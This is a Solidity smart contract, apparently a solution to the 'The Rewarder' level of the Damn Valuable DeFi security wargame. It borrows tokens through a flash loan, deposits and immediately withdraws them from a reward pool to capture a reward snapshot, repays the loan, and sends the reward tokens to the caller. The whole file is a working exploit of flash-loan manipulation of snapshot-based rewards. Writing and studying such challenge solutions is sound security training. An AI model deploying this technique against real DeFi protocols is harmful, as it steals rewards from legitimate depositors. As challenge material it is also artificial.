// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private theRewarderPool;
    RewardToken private rewardToken;
    DamnValuableToken private dvt;
    address private attacker;

    function attack(
        address _flashLoanerPool,
        address _theRewarderPool,
        address _rewardToken,
        address _dvt,
        uint256 amount
    ) external {
        attacker = msg.sender;
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        dvt = DamnValuableToken(_dvt);

        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        dvt.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}